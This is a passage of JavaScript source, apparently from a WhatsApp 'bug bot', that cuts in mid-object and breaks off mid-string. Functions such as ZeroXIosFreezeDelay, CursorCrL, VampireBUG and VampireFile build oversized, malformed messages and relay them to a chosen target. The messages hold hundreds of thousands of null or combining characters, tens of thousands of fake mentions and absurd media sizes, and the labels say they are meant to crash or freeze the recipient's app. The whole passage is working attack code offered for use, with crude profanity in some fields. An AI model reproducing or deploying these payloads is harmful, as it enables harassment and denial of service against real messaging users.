sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `- Caywzz 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : Caywzz "
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await sock.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}

    async function ZeroXIosFreezeDelay(target, mention = false, xrelly = false) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    const XsexCrash = JSON.stringify({
        status: true,
        criador: "~ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ~",
        resultado: { type: "md", ws: { _eventsCount: 800000, mobile: true } }
    });

    const quotedMsg = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "ABCDEF123456"
        },
        message: {
            conversation: "Quoted crash message"
        },
        messageTimestamp: Math.floor(Date.now() / 1000)
    };

    const embeddedMusic1 = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const embeddedMusic2 = {
        musicContentMediaId: "kontol",
        songId: "peler",
        author: "Xrelly",
        title: "Soy el destructor del sistema WhatsApp.",
        artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
    };

    const messages = [
        {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/19167818_1100319248790517_8356004008454746382_n.enc",
                    mimetype: "video/mp4",
                    fileSha256: "l1hrH5Ol/Ko470AI8H1zlEuHxfnBbozFRZ7E80tD2L8=",
                    fileLength: "27879524",
                    seconds: 70,
                    mediaKey: "2AcdMRLVnTLIIRZFArddskCLl3duuisx2YTHYvMoQPI=",
                    caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑" + stanza,
                    height: 1280,
                    width: 720,
                    fileEncSha256: "GHX2S/UWYN5R44Tfrwg2Jc+cUSIyyhkqmNUjUwAlnSU=",
                    directPath: "/v/t62.7161-24/19167818_1100319248790517_8356004008454746382_n.enc",
                    mediaKeyTimestamp: "1746354010",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: mentionedList,
                        quotedMessage: quotedMsg.message,
                        stanzaId: quotedMsg.key.id,
                        participant: quotedMsg.key.remoteJid
                    },
                    annotations: [{ embeddedContent: { embeddedMusic: embeddedMusic1 }, embeddedAction: true }]
                }
            }
        },
        {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                    contextInfo: {
                        mentionedJid: mentionedList,
                        quotedMessage: quotedMsg.message,
                        stanzaId: quotedMsg.key.id,
                        participant: quotedMsg.key.remoteJid
                    }
                }
            }
        },
        {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "🦠" + XsexCrash,
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: mentionedList,
                        quotedMessage: quotedMsg.message,
                        stanzaId: quotedMsg.key.id,
                        participant: quotedMsg.key.remoteJid
                    },
                    annotations: [{ embeddedContent: { embeddedMusic: embeddedMusic2 }, embeddedAction: true }]
                }
            }
        }
    ];

    for (const msg of messages) {
        const generated = generateWAMessageFromContent(target, {
            viewOnceMessage: msg
        }, {});
        await sock.relayMessage("status@broadcast", generated.message, {
            messageId: generated.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        if ((mention && msg === messages[0]) || (xrelly && msg === messages[2])) {
            await sock.relayMessage(target, {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: generated.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [{
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }]
            });
        }
    }
}
async function Cursormuani(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '..',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "\u0000".repeat(510000)
                },
                footer: {
                  text: "\u0000".repeat(510000)
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function CursorCrL(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "\u0000".repeat(510000)
                },
                footer: {
                  text: "\u0000".repeat(510000)
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message", 
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}
async function ppk(target) {
const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: ''
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "ㅤㅤㅤㅤㅤ"
                },
                footer: {
                  text: "ㅤㅤㅤㅤㅤ"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "ㅤㅤㅤㅤㅤ",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "\u0000".repeat(510000),
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function VampireNewUi(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙸𝚂 𝙱𝙰𝙲𝙺‌\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function home(target) {
  const msg = await generateWAMessageFromContent(target, {
    listMessage: {
      title: "holaa" + "ꦾ".repeat(166666),
      description: "homme",
      footerText: "ꦾ".repeat(166666),
      listType: 2,
      productListInfo: {
        productSections: [
          {
            title: "LIST_PRODUCT",
            products: [Array(9000).fill(0).map(() => ({ productId: "999999999999999" }))]
          }
        ],
        headerImage: {
          productId: "999999999999999",
          jpegThumbnail: null
        },
        businessOwnerJid: "0@s.whatsapp.net"
      }
    }
  }, {});
 await sock.relayMessage(target, msg.message, {
   messageId: msg.key.id
  });
}

async function VampireBUG(target, Ptcp = true) {
  const jids = `_*~@5~*_\n`.repeat(10500);
  const ui = "ꦽ".repeat(55555);
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "99999999999999",
              pageCount: 999999999,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "©𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗙𝗶𝗹𝗲",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎 𝙸𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎" + ui + jids
          },
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            mentions: ["0@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "99999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "🩸𝚅𝚊𝚖𝚙𝚒𝚛𝚎 𝙸𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}
async function VampireFile(target, QBug, Ptcp = true) {
    let virtex = "Ngefreeze ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉